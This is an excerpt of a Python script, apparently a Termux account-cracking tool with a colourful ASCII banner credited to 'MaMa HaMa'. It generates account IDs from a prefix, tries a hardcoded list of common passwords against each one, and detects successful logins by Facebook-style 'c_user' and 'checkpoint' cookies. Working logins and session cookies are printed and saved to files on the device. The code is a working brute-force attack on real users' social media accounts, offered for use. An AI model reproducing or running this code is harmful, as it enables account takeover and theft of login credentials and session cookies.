...
ha = current.day
today = date.today()
logo =                                          ("""  \x1b[1;91m_    _          __  __             
 | |  | |   /\   |  \/  |   /\    
\x1b[1;92m | |__| |  /  \  | \  / |  /  \     \x1b[1;92m  COMING
 |  __  | / /\ \ | |\/| | / /\ \     \x1b[1;93m  SOON
 | |  | |/ ____ \| |  | |/ ____ \     \x1b[1;96m  V1
 |_|  |_/_/    \_\_|  |_/_/    \_\                    
\x1b[1;91m>>    \x1b[1;94mBaxer Bet Bo Toole MaM HaMa➠A R A   \x1b[1;91m <<
\x1b[1;91m>>     \x1b[1;96mToole MaM HaMa➠A R A Version (1.0)   \x1b[1;91m <<
\033[;90m===============================================================
\033[1;33m[-] \x1b[1;91mCODBY     :\033[1;35m MaMa HaMa➠A R A
\033[1;33m[-] \x1b[1;91mVERSION   :\033[1;35m UPDATE (1)
\033[1;33m[-] \x1b[1;91mCHANAL    :\033[1;35m @termux_v69
...
def i():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\033[1;93m')
        for love in user:
            pwx = [love,'kurd1234','kurd12345','kurd123456','hama1234','hama12345','qaladzaqaladza','qaladza1234','hama1122','qaladza12345','hamahama','kurdkurd','qaladza1122','zharawa1122']
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[HaMa-OK] ' +uid+ ' | ' +ps+    '  \n\033[1;35m[√]\033[1;32mCOOKIE = \033[1;34m'+coki+  ' \n\033[1;36m[√] [AGENT] = \033[1;35m'+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/HaMa-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[HaMa-CP]  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/HaMa-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s[HaMa] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
